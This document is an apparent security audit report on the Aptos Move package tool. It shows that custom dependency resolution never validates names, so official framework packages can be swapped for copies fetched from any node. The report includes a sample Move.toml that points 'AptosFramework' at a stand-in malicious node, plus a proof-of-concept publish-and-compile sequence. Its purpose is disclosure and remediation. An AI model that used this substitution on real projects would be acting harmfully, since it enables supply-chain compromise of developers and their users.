# Audit Report

## Title
Missing Package Name Validation in Custom Dependency Resolution Allows Framework Package Substitution Attack

## Summary
The `resolve_custom_dependency()` function does not validate the `dep_name` parameter against an allowlist of official framework packages (AptosFramework, MoveStdlib, AptosStdlib, etc.), allowing arbitrary package names to be resolved from any custom node URL and address without verification. [1](#0-0) 

## Finding Description
The Aptos Move package system defines official framework packages that should only be sourced from trusted locations (official GitHub repository or specific on-chain addresses like 0x1). However, the custom dependency resolution mechanism lacks validation to enforce this invariant.

When a developer specifies a dependency in their Move.toml file using the custom `aptos` dependency type: [2](#0-1) 

The parser creates a `CustomDepInfo` struct with user-controlled `node_url`, `package_address`, and `package_name` fields: [3](#0-2) 

This information is passed to `resolve_custom_dependency()`, which ignores the `dep_name` parameter (note the underscore prefix indicating it's unused) and directly downloads the package without validation: [4](#0-3) 

The system has the capability to identify official packages through `StdLib::from_package_name()`: [5](#0-4) 

And defines the official source as a well-known Git URL: [6](#0-5) 

However, this validation mechanism is never invoked in the custom dependency resolution path.

**Attack Scenario:**
1. Attacker publishes a malicious package named "AptosFramework" to their controlled node at address 0xMalicious
2. Through social engineering, supply chain compromise, or malicious PR, the attacker modifies a project's Move.toml to include:
   ```toml
   [dependencies]
   AptosFramework = { aptos = "https://malicious-node.example", address = "0xMalicious" }
   ```
3. Developer runs `aptos move compile`, downloading the malicious package
4. Malicious code is compiled into the project
5. If deployed, the malicious code executes on-chain with developer's privileges

This breaks the **Access Control** invariant: "System addresses (@aptos_framework, @core_resources) must be protected" by allowing substitution of system framework packages with arbitrary code.

## Impact Explanation
This issue enables **supply chain attacks** through dependency confusion. While it requires developer action (modifying Move.toml or accepting a malicious change), it represents a significant security gap because:

1. **Framework packages are security-critical**: They define core blockchain operations, account management, and resource handling
2. **No warning or validation**: Developers receive no indication they're using non-standard sources for framework packages
3. **Silent substitution**: The build succeeds without alerting that official packages are being replaced
4. **Deployment risk**: If deployed, malicious code executes on-chain with potential for fund theft or state manipulation

However, this does NOT meet **Critical** severity because:
- It requires compromising the build configuration (not automatic)
- Default `aptos move init` uses safe Git dependencies
- The vulnerability is in the build tool, not the runtime blockchain

This falls under **High** severity per the security question classification, representing a "Significant protocol violation" in the development toolchain that could lead to deployed vulnerabilities.

## Likelihood Explanation
**Likelihood: LOW to MEDIUM**

**Factors reducing likelihood:**
- Default project initialization uses safe Git dependencies for framework packages
- Requires social engineering or compromised build configuration
- Developers would need to explicitly change from git to custom dependencies
- Code review processes should catch suspicious dependency changes

**Factors increasing likelihood:**
- No warnings when using custom dependencies for framework packages
- Automated tools or scripts might generate Move.toml files
- CI/CD pipelines could be compromised to inject malicious dependencies
- Typosquatting: Similar package names on malicious nodes could catch inattentive developers

## Recommendation
Implement validation in `resolve_custom_dependency()` to prevent substitution of official framework packages:

```rust
fn resolve_custom_dependency(
    &self,
    dep_name: Symbol,  // Remove underscore - actually use this parameter
    info: &CustomDepInfo,
) -> anyhow::Result<()> {
    // Validate official packages come from trusted sources
    if let Some(std_lib) = StdLib::from_package_name(dep_name) {
        // Option 1: Reject custom dependencies for framework packages entirely
        bail!(
            "Package '{}' is an official framework package and must use git dependencies. \
             Use: {} = {{ git = \"{}\", rev = \"mainnet\", subdir = \"{}\" }}",
            dep_name,
            std_lib.as_str(),
            StdLib::STD_GIT_URL,
            std_lib.sub_dir()
        );
        
        // OR Option 2: Validate node_url and address for official packages
        // const OFFICIAL_NODE_URLS: &[&str] = &["https://fullnode.mainnet.aptoslabs.com", ...];
        // const OFFICIAL_ADDRESS: &str = "0x1";
        // if !OFFICIAL_NODE_URLS.contains(&info.node_url.as_str()) {
        //     bail!("Official package '{}' must be downloaded from trusted nodes", dep_name);
        // }
        // if info.package_address.as_str() != OFFICIAL_ADDRESS {
        //     bail!("Official package '{}' must be at address {}", dep_name, OFFICIAL_ADDRESS);
        // }
    }
    
    block_on(maybe_download_package(info))
}
```

## Proof of Concept

**Step 1: Create malicious package on a test node**
```bash
# Deploy malicious package named "AptosFramework" to test node at 0xBadActor
aptos move publish --package-dir ./malicious-framework \
    --named-addresses AptosFramework=0xBadActor
```

**Step 2: Create vulnerable Move.toml**
```toml
[package]
name = "VulnerableProject"
version = "1.0.0"

[dependencies]
# Malicious dependency substituting official framework
AptosFramework = { aptos = "https://testnet.aptoslabs.com", address = "0xBadActor" }

[addresses]
vulnerable_project = "_"
```

**Step 3: Compile and observe**
```bash
aptos move compile
# Expected: Package compiles successfully using malicious "AptosFramework"
# Actual: No warning that framework package is from non-standard source
# Result: Malicious code is now part of the compiled modules
```

**Step 4: Verification**
The downloaded package will be in `.move/` directory. Inspecting the source will show it came from the malicious address, not the official 0x1 framework address.

This demonstrates that the system accepts any package name from any source without validation against official package lists.

## Notes

While this vulnerability requires developer action to exploit, it represents a genuine security gap in the Move package toolchain. The system has all the necessary components to prevent this attack (package name identification, official source definitions) but fails to enforce validation at the critical point where custom dependencies are resolved.

The fix is straightforward and would prevent an entire class of supply chain attacks without impacting legitimate use cases for custom dependencies on non-framework packages.

### Citations

**File:** crates/aptos/src/move_tool/package_hooks.rs (L29-35)
```rust
    fn resolve_custom_dependency(
        &self,
        _dep_name: Symbol,
        info: &CustomDepInfo,
    ) -> anyhow::Result<()> {
        block_on(maybe_download_package(info))
    }
```

**File:** crates/aptos/src/move_tool/package_hooks.rs (L38-54)
```rust
async fn maybe_download_package(info: &CustomDepInfo) -> anyhow::Result<()> {
    if !info
        .download_to
        .join(CompiledPackageLayout::BuildInfo.path())
        .exists()
    {
        let registry = CachedPackageRegistry::create(
            Url::parse(info.node_url.as_str())?,
            load_account_arg(info.package_address.as_str())?,
            false,
        )
        .await?;
        let package = registry.get_package(info.package_name).await?;
        package.save_package_to_disk(info.download_to.as_path())
    } else {
        Ok(())
    }
```

**File:** third_party/move/tools/move-package/src/source_package/manifest_parser.rs (L392-424)
```rust
                (None, None, Some(custom_key)) => {
                    let package_name = Symbol::from(dep_name);
                    let address = match table.remove("address") {
                        None => bail!("Address not supplied for 'node' dependency"),
                        Some(r) => Symbol::from(
                            r.as_str()
                                .ok_or_else(|| format_err!("Node address not a string"))?,
                        ),
                    };
                    // Downloaded packages are of the form <sanitized_node_url>_<address>_<package>
                    let node_url = custom_key
                        .as_str()
                        .ok_or_else(|| anyhow::anyhow!("Git URL not a string"))?;
                    let local_path = PathBuf::from(MOVE_HOME.clone()).join(format!(
                        "{}_{}_{}",
                        url_to_file_name(node_url),
                        address,
                        package_name
                    ));
                    node_info = Some(PM::CustomDepInfo {
                        node_url: Symbol::from(node_url),
                        package_address: address,
                        package_name,
                        download_to: local_path.clone(),
                    });
                    Ok(PM::Dependency {
                        subst,
                        version,
                        digest,
                        local: local_path,
                        git_info,
                        node_info,
                    })
```

**File:** third_party/move/tools/move-package/src/source_package/parsed_manifest.rs (L104-114)
```rust
pub struct CustomDepInfo {
    /// The url of the node to download from
    pub node_url: Symbol,
    /// The address where the package is published. The representation depends
    /// on the registered node resolver.
    pub package_address: Symbol,
    /// The address where the package is published.
    pub package_name: Symbol,
    /// Where the package is downloaded to.
    pub download_to: PathBuf,
}
```

**File:** third_party/move/tools/move-package/src/source_package/std_lib.rs (L22-24)
```rust
impl StdLib {
    /// The well-known git URL for the standard library.
    const STD_GIT_URL: &'static str = "https://github.com/aptos-labs/aptos-framework.git";
```

**File:** third_party/move/tools/move-package/src/source_package/std_lib.rs (L68-77)
```rust
    pub fn from_package_name(package_name: Symbol) -> Option<StdLib> {
        match package_name.as_str() {
            "AptosToken" => Some(StdLib::AptosToken),
            "AptosTokenObjects" => Some(StdLib::AptosTokenObjects),
            "AptosFramework" => Some(StdLib::AptosFramework),
            "AptosStdlib" => Some(StdLib::AptosStdlib),
            "MoveStdlib" => Some(StdLib::MoveStdlib),
            _ => None,
        }
    }
```
